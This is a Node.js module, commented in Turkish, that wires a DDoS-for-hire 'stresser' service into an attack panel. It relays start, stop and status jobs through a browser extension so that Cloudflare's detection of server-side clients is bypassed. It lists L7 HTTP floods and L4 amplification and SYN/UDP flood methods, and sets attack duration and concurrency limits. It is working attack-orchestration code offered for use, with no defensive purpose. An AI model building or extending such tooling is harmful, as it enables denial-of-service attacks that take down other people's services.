/**
 * rackghost.js
 * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
 *
 * RackGhost'un public API'si yok ve Cloudflare sunucu tarafli istemcileri
 * reddediyor (cookie replay tespiti). Bu yuzden istekler KULLANICININ
 * TARAYICISINDA calisan Loki Agent eklentisi uzerinden gider:
 *
 *   Loki panel -> backend is kuyrugu -> eklenti poll -> rackghost (kullanicinin
 *   Chrome'u, kendi oturumu+proxy'si) -> eklenti sonucu backend'e postalar.
 *
 * Eklenti cevrimdisi ise cagrilar bekler/timeout olur ve watchdog Telegram'dan
 * "agent cevrimdisi" bildirimi atar.
 *
 * Method/limit bilgisi panelin stresser sayfasindan sabitlendi.
 */

const { sendTelegram } = require('./telegram');

const API_WAIT_TIMEOUT_MS = 90000;
const AGENT_OFFLINE_MS = 60 * 1000; // bu sure poll gelmezse agent offline sayilir
const WATCHDOG_INTERVAL_MS = 5 * 60 * 1000;

const METHODS = [
  { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
  { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
  { value: 'HTTPSMIX', label: '[BETA] HTTPS-MIX', layer: 'L7' },
  { value: 'SOCKETV5', label: '[BETA] SOCKET V5 (HTTP/1.1 HTTPS)', layer: 'L7' },
  { value: 'WEBSOCKETV2', label: '[BETA] WEBSOCKET v2 (WS/WSS)', layer: 'L7' },
  { value: 'SOUNDV2', label: 'SOUND-V2 (HTTP/HTTPS/HTTP2) [CF]', layer: 'L7' },
  { value: 'HTTPSCRYPTO', label: 'HTTPS-CRYPTO v2 (HTTPS2)', layer: 'L7' },
  { value: 'HTTPSFLOOD', label: 'HTTPS REQUEST-CUSTOM (HTTP/HTTP2)', layer: 'L7' },
  { value: 'HTTPCUSTOM', label: 'HTTPS-CUSTOM v2 (Browser) [ENT]', layer: 'L7' },
  { value: 'SOCKETV4', label: 'SOCKET V4 (HTTP/1.1)', layer: 'L7' },
  { value: 'SPAMMERV2', label: 'SPAMMER v2 (HTTPS/1.1)', layer: 'L7' },
  { value: 'WEBSOCKET-CUSTOM', label: 'WEBSOCKET-CUSTOM (WS/WSS)', layer: 'L7' },
  { value: 'TOR', label: 'TOR (.onion)', layer: 'L7' },
  { value: 'DNS', label: 'DNS Amplification', layer: 'L4' },
  { value: 'NTP', label: 'NTP Amplification', layer: 'L4' },
  { value: 'TCPSYNRST', label: 'TCP SYN RST', layer: 'L4' },
  { value: 'TCPACK', label: 'TCP ACK', layer: 'L4' },
  { value: 'TCPBYPASS', label: 'TCP Bypass', layer: 'L4' },
  { value: 'TCPBYPASS2', label: 'TCP Bypass v2', layer: 'L4' },
  { value: 'TCPGAME', label: 'TCP Game', layer: 'L4' },
  { value: 'TCPSSH', label: 'TCP SSH', layer: 'L4' },
  { value: 'TCPSYN', label: 'TCP SYN', layer: 'L4' },
  { value: 'TCPSYNACK', label: 'TCP SYNACK', layer: 'L4' },
  { value: 'UDPABUSE', label: 'UDP Abuse', layer: 'L4' },
  { value: 'UDPGAMESERVER', label: 'UDP Game Server', layer: 'L4' },
  { value: 'ICMP', label: 'ICMP', layer: 'L4' },
  { value: 'UDPCUSTOM', label: 'UDP Custom', layer: 'L4' },
  { value: 'TCPCUSTOM', label: 'TCP Custom', layer: 'L4' },
  { value: 'TCPAMP', label: 'TCP Enterprise', layer: 'L4' },
  { value: 'UDPMIX', label: 'UDP Mix', layer: 'L4' },
  { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
];

const LIMITS = { maxTime: 7200, maxConcurrents: 15 };
const AGENT_TOKEN = process.env.LOKI_RG_AGENT_TOKEN || 'rg-agent-loki-2026';

// Is kuyrugu: id -> { payload, result, resolve, createdAt }
const jobs = new Map();
let jobSeq = 0;
let lastAgentPollAt = null;
let lastOkAt = null;
let lastError = null;
let offlineAlerted = false;
let watchdogTimer = null;

function nextJobId() {
  jobSeq += 1;
  return `job_${Date.now()}_${jobSeq}`;
}

/** Agent'in alacagi bekleyen is (varsa hemen, yoksa long-poll). */
function takeJob() {
  for (const [id, job] of jobs) {
    if (!job.taken) {
      job.taken = true;
      return { id, payload: job.payload };
    }
  }
  return null;
}

/** Yeni is kuyruga ekle ve agent'in sonucunu bekle. */
function enqueue(payload) {
  const id = nextJobId();
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(() => {
      jobs.delete(id);
      const err = new Error('RackGhost agent cevap vermedi (eklenti cevrimdisi olabilir)');
      err.agentOffline = true;
      reject(err);
    }, API_WAIT_TIMEOUT_MS);
    jobs.set(id, {
      payload,
      taken: false,
      createdAt: Date.now(),
      resolve: (result) => {
        clearTimeout(timeout);
        jobs.delete(id);
        if (result && result.ok) {
          lastOkAt = new Date().toISOString();
          lastError = null;
          offlineAlerted = false;
          resolve(result.data);
        } else {
          lastError = (result && result.error) || 'agent hatasi';
          reject(new Error(lastError));
        }
      }
    });
  });
}

async function apiCall(payload) {
  return enqueue(payload);
}

/** Saldiri baslat. params: {host, port, time, concurrents, method} */
async function startAttack(params) {
  const data = await apiCall({
    action: 'start',
    api: 2,
    params: {
      host: params.host,
      port: parseInt(params.port),
      time: parseInt(params.time),
      concurrents: parseInt(params.concurrents) || 1,
      method: String(params.method).toUpperCase()
    }
  });
  if (!data || !data.success) {
    throw new Error(data?.message || data?.error || 'RackGhost saldiri baslatamadi');
  }
  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items };
}

/** Saldiri durdur (id + host gerekli) */
async function stopAttack(id, host) {
  return apiCall({ action: 'stop', api: 2, id: String(id), host });
}

/** Aktif saldirilar */
async function getOngoing() {
  const data = await apiCall({ action: 'ongoing', api: 2 });
  return data && Array.isArray(data.data) ? data.data : [];
}

function getMethods() {
  return METHODS;
}

function isConfigured() {
  return true; // agent tabanli; cookie gerekmez
}

function agentOnline() {
  return lastAgentPollAt && (Date.now() - lastAgentPollAt) < AGENT_OFFLINE_MS;
}

function getStatus() {
  return {
    configured: true,
    agentOnline: agentOnline(),
    lastAgentPollAt: lastAgentPollAt ? new Date(lastAgentPollAt).toISOString() : null,
    lastOkAt,
    lastError,
    pendingJobs: jobs.size,
    limits: LIMITS
  };
}

// ---- Agent endpoint'leri icin handler'lar ----

function handleAgentPoll(req, res) {
  const token = req.headers['x-agent-token'] || req.query.token;
  if (token !== AGENT_TOKEN) return res.status(401).json({ error: 'unauthorized' });
  lastAgentPollAt = Date.now();
  offlineAlerted = false;
  const job = takeJob();
  if (job) return res.json({ job });
  // Long-poll: 25sn bekle, is gelirse hemen dondur
  const started = Date.now();
  const timer = setInterval(() => {
    const j = takeJob();
    if (j) {
      clearInterval(timer);
      return res.json({ job: j });
    }
    if (Date.now() - started > 25000) {
      clearInterval(timer);
      return res.json({ job: null });
    }
  }, 500);
  req.on('close', () => clearInterval(timer));
}

function handleAgentResult(req, res) {
  const token = req.headers['x-agent-token'] || req.query.token;
  if (token !== AGENT_TOKEN) return res.status(401).json({ error: 'unauthorized' });
  const { id, result } = req.body || {};
  const job = jobs.get(id);
  if (!job) return res.status(404).json({ error: 'job bulunamadi (timeout olmus olabilir)' });
  job.resolve(result || { ok: false, error: 'bos sonuc' });
  res.json({ ok: true });
}

async function watchdogTick() {
  if (!agentOnline() && !offlineAlerted) {
    offlineAlerted = true;
    sendTelegram(
      `⚠️ <b>RackGhost agent çevrimdışı</b>\n` +
      `Loki Agent eklentisi ${Math.round(AGENT_OFFLINE_MS / 1000)} saniyedir yok.\n` +
      `Proxy'li Chrome kapaliysa ac; eklenti calisiyor mu kontrol et.`
    ).catch(() => {});
  }
}

function initRackghost() {
  if (watchdogTimer) clearInterval(watchdogTimer);
  watchdogTimer = setInterval(() => {
    watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
  }, WATCHDOG_INTERVAL_MS);
  console.log('[rackghost] init: agent-kuyruk modu (tarayici ici ajan)');
}

module.exports = {
  initRackghost,
  startAttack,
  stopAttack,
  getOngoing,
  getMethods,
  getStatus,
  isConfigured,
  agentOnline,
  handleAgentPoll,
  handleAgentResult,
  LIMITS
};
